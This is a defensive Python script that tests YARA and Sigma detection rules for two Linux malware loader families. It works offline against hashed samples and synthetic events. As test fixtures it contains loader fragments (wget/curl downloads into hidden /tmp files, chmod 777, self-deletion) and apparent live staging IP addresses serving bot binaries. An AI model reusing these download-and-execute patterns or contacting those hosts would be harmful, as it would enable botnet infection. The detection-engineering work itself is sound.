#!/usr/bin/env python3
"""Offline detector checks. Never executes samples or contacts the network.

Requires yara-python, PyYAML, pysigma and pysigma-backend-splunk.
Pass a directory of previously decrypted <sha256>.bin files OUTSIDE the repo.
Outputs are analysis evidence, not payloads. Optional baseline CSV is the same
rule-by-sample format emitted here before any rule changes.

python tools/validate_static.py --corpus /private/extracted --output /private/tests
"""
import argparse
import csv
import hashlib
import importlib.metadata
import json
from pathlib import Path
import uuid

import yara
import yaml
from sigma.collection import SigmaCollection
from sigma.backends.splunk import SplunkBackend

ROOT = Path(__file__).resolve().parent.parent
INTENDED = {
    'KTHREAD_LOADER_archmap': 'b1a84cfd4176a472e319ee7733e55998ae69b9752fd26f8c853cefd836a477b9',
    'NET_BOT_LOADER_staging': '39be6853a8204ce6455a373a6ffb4cb4672d4a62d90be69f7d6eeb66cda10b96',
}


def matches_selection(selection, event):
    """Evaluate only the literal/contains/endswith subset used in NEW rules.

    Not a general Sigma engine and not an end-to-end SIEM execution test.
    Unknown modifiers fail rather than silently passing.
    """
    for expression, values in selection.items():
        field, *modifiers = expression.split('|')
        assert modifiers in ([], ['contains'], ['endswith'])
        values = values if isinstance(values, list) else [values]
        actual = event.get(field)
        if not isinstance(actual, str):
            return False
        if not any(actual.endswith(value) if modifiers == ['endswith'] else
                   value in actual if modifiers == ['contains'] else actual == value
                   for value in values):
            return False
    return True


def sigma_tests(doc, events):
    detection = doc['detection']
    names = detection['condition'].split(' and ')
    assert set(names) == set(detection) - {'condition'}
    for event, expected in events:
        actual = all(matches_selection(detection[name], event) for name in names)
        assert actual == expected, (doc['title'], event, expected, actual)
    return len(events)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--corpus', required=True, type=Path)
    parser.add_argument('--output', required=True, type=Path)
    parser.add_argument('--baseline', type=Path)
    args = parser.parse_args()
    assert not args.corpus.resolve().is_relative_to(ROOT), 'Extract outside Git'
    assert not args.output.resolve().is_relative_to(ROOT), 'Keep scratch outside Git'
    args.output.mkdir(parents=True, exist_ok=True)
    samples = {}
    for path in sorted(args.corpus.glob('*.bin')):
        data = path.read_bytes()
        digest = hashlib.sha256(data).hexdigest()
        assert path.stem == digest, f'Hash mismatch: {path.name}'
        samples[digest] = data
    assert samples, 'No corpus files'
    assert set(INTENDED.values()) <= samples.keys(), 'Missing intended samples'

    compiled = {}
    sources = sorted((ROOT / 'yara').glob('*.yar'))
    yara.compile(filepaths={p.stem: str(p) for p in sources}, error_on_warning=True)
    for path in sources:
        rule = yara.compile(filepath=str(path), error_on_warning=True)
        names = [r.identifier for r in rule]
        assert len(names) == 1, f'One rule per upload: {path}'
        compiled[names[0]] = rule
    names = list(compiled)
    hits = {sha: {name: bool(rule.match(data=data)) for name, rule in compiled.items()}
            for sha, data in samples.items()}
    for name, intended in INTENDED.items():
        assert {sha for sha in samples if hits[sha][name]} == {intended}, name
    compared = 0
    if args.baseline:
        with args.baseline.open(newline='', encoding='utf-8') as handle:
            reader = csv.DictReader(handle)
            baseline_names = [n for n in reader.fieldnames
                              if n not in ('sha256', 'existing_family')]
            for row in reader:
                sha = row['sha256']
                assert sha in hits, f'Baseline sample missing: {sha}'
                for name in baseline_names:
                    assert name in compiled
                    assert hits[sha][name] == bool(int(row[name])), (sha, name)
                    compared += 1
    with (args.output / 'yara-hits.csv').open('w', newline='', encoding='utf-8') as handle:
        writer = csv.writer(handle)
        writer.writerow(['sha256', *names])
        for sha in samples:
            writer.writerow([sha, *[int(hits[sha][name]) for name in names]])

    # Harmless text fixtures, not scripts or working loaders.
    benign = [b'', b'kernel thread kworker_u8 jbd2_sda1d zswap_shrinkd cfg80211d',
              b'net_bot net.x86_64 net.mpsl net.arm7',
              b'www.ikindalikemenbutonlyontuesday.com',
              b'wget curl chmod 777 /tmp /bins/net.arc',
              b'legitimate provisioning documentation',
              b'http://44.210.140.205/bins http://160.119.66.206/bins/net.arm7']
    for data in benign:
        assert all(not compiled[name].match(data=data) for name in INTENDED)
    mutations = {
        'KTHREAD_LOADER_archmap': [
            b'DST="$WRITABLE_DIR/.$BIN_NAME"', b'wget -qO "$DST" "$URL"',
            b'curl -sfLo "$DST" "$URL"', b'SELF="$(realpath "$0" 2>/dev/null)"',
            b'rm -f "$SELF"',
        ],
        'NET_BOT_LOADER_staging': [b'-O net_bot && chmod 777 net_bot',
                                   b'-o net_bot && chmod 777 net_bot',
                                   b'rm -rf net_bot net_http.sh'],
    }
    negatives = 0
    for name, markers in mutations.items():
        data = samples[INTENDED[name]]
        for marker in markers:
            assert marker in data
            assert not compiled[name].match(data=data.replace(marker, b'X' * len(marker)))
            negatives += 1
    # Fewer than the required mapping/path/exec strings must not match.
    thresholds = {
        'KTHREAD_LOADER_archmap': [b'BIN_NAME="kworker_u8"', b'BIN_NAME="jbd2_sda1d"'],
        'NET_BOT_LOADER_staging': [b'/bins/net.x86_64', b'/bins/net.mpsl'],
    }
    for name, markers in thresholds.items():
        data = samples[INTENDED[name]]
        for marker in markers:
            data = data.replace(marker, b'X' * len(marker))
        assert not compiled[name].match(data=data)
        negatives += 1
    data = samples[INTENDED['NET_BOT_LOADER_staging']]
    for marker in [b'./net_bot net.x86_64 && exit;', b'./net_bot net.mpsl && exit;']:
        data = data.replace(marker, b'X' * len(marker))
    assert not compiled['NET_BOT_LOADER_staging'].match(data=data)
    negatives += 1

    queries = {}; ids = set(); docs = {}
    for path in sorted((ROOT / 'sigma').glob('*.yml')):
        text = path.read_text(encoding='utf-8'); doc = yaml.safe_load(text)
        assert {'title', 'id', 'status', 'description', 'author', 'date', 'logsource',
                'detection', 'falsepositives', 'level', 'tags'} <= doc.keys()
        assert uuid.UUID(doc['id']).version == 4 and doc['id'] not in ids
        assert doc['falsepositives']
        ids.add(doc['id']); docs[path.stem] = doc
        queries[path.name] = SplunkBackend().convert(SigmaCollection.from_yaml(text))
        assert queries[path.name] and all(queries[path.name])
    k_events = []
    for name in ['kworker_u8', 'jbd2_sda1d', 'zswap_shrinkd', 'cfg80211d']:
        for image in ['/usr/bin/wget', '/usr/bin/curl']:
            # Reserved .invalid host; these strings are never executed.
            k_events.append(({'Image': image, 'CommandLine':
                f'{image} -o /tmp/.{name} http://analysis.invalid/bins/{name}'}, True))
    k_events += [({'Image': '/usr/bin/curl', 'CommandLine':
                  'curl -o /tmp/kworker_u8 http://analysis.invalid/bins/kworker_u8'}, False),
                 ({'Image': '/usr/bin/curl', 'CommandLine':
                  'curl -o /tmp/.kworker_u8 http://analysis.invalid/package'}, False),
                 ({'Image': '/bin/echo', 'CommandLine':
                  'echo /tmp/.kworker_u8 /bins/kworker_u8'}, False), ({}, False)]
    n_events = [({'Image': '/tmp/net_bot', 'CommandLine': f'./net_bot net.{arch}'}, True)
                for arch in ['x86_64','x86','mips','mpsl','arm','arm5','arm6','arm7',
                             'ppc','m68k','sh4','spc','arc','i686','i486']]
    n_events += [({'Image': '/usr/bin/echo', 'CommandLine': 'echo net.mips'}, False),
                 ({'Image': '/tmp/net_bot', 'CommandLine': './net_bot --help'}, False),
                 ({'Image': '/tmp/not_net_bot', 'CommandLine': './not_net_bot net.arm7'}, False),
                 ({}, False)]
    event_count = sigma_tests(docs['kthread_loader_hidden_download'], k_events)
    event_count += sigma_tests(docs['net_bot_loader_tagged_execution'], n_events)
    (args.output / 'sigma-splunk.json').write_text(json.dumps(queries, indent=2), encoding='utf-8')
    summary = {'yara_version': yara.__version__, 'unique_samples': len(samples),
               'rules_compiled_without_warnings': len(names),
               'rule_sample_evaluations': len(samples) * len(names),
               'baseline_cells_unchanged': compared,
               'intended_new_hits': INTENDED, 'new_cross_sample_hits': 0,
               'benign_text_fixtures': len(benign), 'yara_near_miss_tests': negatives,
               'sigma_rules_parsed_and_converted': len(queries),
               'sigma_synthetic_events': event_count,
               'pysigma': importlib.metadata.version('pysigma'),
               'splunk_backend': importlib.metadata.version('pysigma-backend-splunk'),
               'limits': 'No dynamic execution, no live SIEM/YARAify/Suricata validation; '
                         'benign fixtures are not a representative clean-software corpus.'}
    # Detect any change to samples during checks.
    for path in args.corpus.glob('*.bin'):
        assert hashlib.sha256(path.read_bytes()).hexdigest() == path.stem
    (args.output / 'validation.json').write_text(json.dumps(summary, indent=2), encoding='utf-8')
    print(json.dumps(summary, indent=2))


if __name__ == '__main__':
    main()
